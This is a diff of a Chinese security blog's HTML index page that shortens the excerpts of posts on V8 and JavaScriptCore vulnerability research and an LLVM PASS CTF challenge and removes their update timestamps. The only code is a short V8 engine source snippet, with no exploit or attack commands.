               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -690,7 +648,7 @@
 </ul>
 </li>
 </ul>
-<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="从源代码到字节码"><a href="#从源代码到字节码" class="headerlink" title="从源代码到字节码"></a>从源代码到字节码</h3><h4 id="流程准备"><a href="#流程准备" class="headerlink" title="流程准备"></a>流程准备</h4><p>v8执行JS的整个流程如下，JS源码经过Parser翻译为抽象语法树(AST)，然后Interpreter遍历AST语法树，生成ByteCode，ByteCode可以直接被解析执行也可以成为热点以后传给TurboFan进行JIT编译，TurboFan解优化时又可以回到字节码进行执行。<br><img src="https://i.loli.net/2021/08/12/QM4yqGd21OKAxjY.png" alt="img"><br>上图是一个抽象的概念图，我们来实际研究一下v8的源码，使用如下代码进行测试使用</p>
+<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="从源代码到字节码"><a href="#从源代码到字节码" class="headerlink" title="从源代码到字节码"></a>从源代码到字节码</h3>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/08/17/issue-926651/#more" rel="contents">
@@ -743,13 +701,6 @@
 
               <time title="创建时间：2021-08-05 16:29:07" itemprop="dateCreated datePublished" datetime="2021-08-05T16:29:07+08:00">2021-08-05</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 18:27:25" itemprop="dateModified" datetime="2025-06-26T18:27:25+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -795,8 +746,7 @@
 <li><a href="#0x06-%E6%84%9F%E6%83%B3">0x06 感想</a></li>
 <li><a href="#0x07-%E5%8F%82%E8%80%83">0x07 参考</a></li>
 </ul>
-<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="Terminate节点的生成"><a href="#Terminate节点的生成" class="headerlink" title="Terminate节点的生成"></a>Terminate节点的生成</h3><p>首先该漏洞与Terminate节点有关，那么我们先来研究一下Terminate节点是如何生成的。在代码目录中使用Visual Studio搜索<code>common()-&gt;Terminate()</code>，发现在<code>src\compiler\bytecode-graph-builder.cc</code>文件中有一处代码生成了Terminate节点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void BytecodeGraphBuilder::Environment::PrepareForLoop(</span><br><span class="line">    const BytecodeLoopAssignments&amp; assignments,</span><br><span class="line">    const BytecodeLivenessState* liveness) &#123;</span><br><span class="line">  // Create a control node for the loop header.</span><br><span class="line">  Node* control = builder()-&gt;NewLoop();</span><br><span class="line"></span><br><span class="line">  …………………………………………………………</span><br><span class="line">  // Connect to the loop end.</span><br><span class="line">  Node* terminate = builder()-&gt;graph()-&gt;NewNode(</span><br><span class="line">      builder()-&gt;common()-&gt;Terminate(), effect, control);</span><br><span class="line">  builder()-&gt;exit_controls_.push_back(terminate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="Terminate节点的生成"><a href="#Terminate节点的生成" class="headerlink" title="Terminate节点的生成"></a>Terminate节点的生成</h3>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/08/05/issues-1076708/#more" rel="contents">
@@ -849,13 +799,6 @@
 
               <time title="创建时间：2021-07-07 10:00:57" itemprop="dateCreated datePublished" datetime="2021-07-07T10:00:57+08:00">2021-07-07</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 18:16:37" itemprop="dateModified" datetime="2025-06-26T18:16:37+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -887,7 +830,6 @@
       
           <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/245946">https://www.anquanke.com/post/id/245946</a></p>
 <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>编译器优化中有一项CSE（公共子表达式消除），如果JS引擎在执行时类型收集的不正确，将导致表达式被错误的消除引发类型混淆。</p>
-<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="CSE"><a href="#CSE" class="headerlink" title="CSE"></a>CSE</h3>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/07/07/CVE-2020-9802/#more" rel="contents">
@@ -940,13 +882,6 @@
 
               <time title="创建时间：2021-06-21 10:30:04" itemprop="dateCreated datePublished" datetime="2021-06-21T10:30:04+08:00">2021-06-21</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 18:14:29" itemprop="dateModified" datetime="2025-06-26T18:14:29+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -978,7 +913,6 @@
       
           <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/244472">https://www.anquanke.com/post/id/244472</a></p>
 <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>JavaScriptCore是Apple的WebKit浏览器内核中的JS引擎，最近学习JavaScriptCore引擎的漏洞利用，在此以CVE-2018-4233为例来学习JavaScriptCore引擎的漏洞利用一般思路</p>
-<h1 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h1><h2 id="JSC引擎执行流程"><a href="#JSC引擎执行流程" class="headerlink" title="JSC引擎执行流程"></a>JSC引擎执行流程</h2>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/06/21/CVE-2018-4233/#more" rel="contents">
@@ -1031,13 +965,6 @@
 
               <time title="创建时间：2021-05-28 10:30:45" itemprop="dateCreated datePublished" datetime="2021-05-28T10:30:45+08:00">2021-05-28</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 17:59:20" itemprop="dateModified" datetime="2025-06-26T17:59:20+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -1065,7 +992,6 @@
       
           <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240748">https://www.anquanke.com/post/id/240748</a></p>
 <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>从红帽杯的<code>simpleVM</code>一题学习LLVM PASS，理解并运行我们的第一个LLVM PASS，然后逆向分析LLVM PASS的模块。</p>
-<h2 id="0x01-LLVM-PASS"><a href="#0x01-LLVM-PASS" class="headerlink" title="0x01 LLVM PASS"></a>0x01 LLVM PASS</h2><p>Pass就是“遍历一遍IR，可以同时对它做一些操作”的意思。<br>LLVM的核心库中会给你一些 Pass类 去继承。你需要实现它的一些方法。 最后使用LLVM的编译器会把它翻译得到的IR传入Pass里，给你遍历和修改。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/05/28/llvm-pass-pwn/#more" rel="contents">
